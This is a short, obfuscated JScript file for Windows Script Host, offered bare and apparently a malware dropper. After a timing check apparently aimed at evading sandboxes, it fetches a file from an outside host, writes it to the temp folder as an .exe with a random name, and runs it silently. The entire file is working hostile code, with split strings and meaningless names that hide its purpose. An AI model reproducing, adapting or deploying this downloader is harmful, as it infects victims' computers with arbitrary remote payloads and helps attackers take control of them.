var s0 = false;
var bu = "CreateObject";
var lU = function U0() {return WScript[bu]("WScript.Shell");}(), fR = 11;
var s = "MSXML2.XMLHTTP";
var d0 = 2123213;
var it = 0;
function iy(C){lU["Run"](C, it, it);};
function g(){return "" + s;};
function q(U1, b){it = it * 1; return U1 - b;};
function p(){return bu;};
/*@cc_on
  @if (@_win32 || @_win64)
    s0 = true;
  @end
@*/
if (s0)
{
var hr = "";
function Vj(){return 22;};
var V = 0; var UP = 0;
function Os()
{
var wa = new this["Date"]();
var L = wa["getUTCMilliseconds"]();
WScript["Sleep"](Vj());
var wa = new this["Date"]();
var i = wa["getUTCMilliseconds"]();
WScript["Sleep"](Vj());
var wa = new this["Date"]();
var d = wa["getUTCMilliseconds"]();
var V = "O";
V = q(i, L);
var UP = "XV";
UP = q(d, i);
hr = "open";
return q(V, UP);
}
var as = false;
var Sd = false;
for (var WW = it; WW < Vj() * 1; WW++){if (Os() != it){
as = true; 
UP = "31" + 11 * V + UP; 
Sd = true; 
break;
}}
function U() {return ((as == true) && (as == Sd)) ? 1 : it;};
if (as && U() && Sd){
function Ym() {return lU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "vwkrezSwZQYV.exe";};
 q0 = g();
 p0 = WScript[bu](q0);
 var g0 = 1;
 while (g0){
try {
p0[hr]("GET", "http://pasticceriabonci.com/n4usj", false);
p0["send"]();
Jw = "Sleep";
for (;;){WScript[Jw](Vj() * 11); if (p0["readystate"] >= 2 * 2) break;};
g0 = it;
} catch(x){};
}
function qD(H) {var K = (1, 2, 3, 4, 5, H); return K;};
Kz = WScript[p()]("ADODB.Stream");
q0 = Kz;
q0[hr]();
q0["type"] = qD(1);
q0["write"](p0["ResponseBody"]);
Kz["position"] = qD(it);
q0["Save" + "ToFile"](Ym(), 2);
Kz["c"+"lose"]();
j = Ym();
iy(j);
}
}

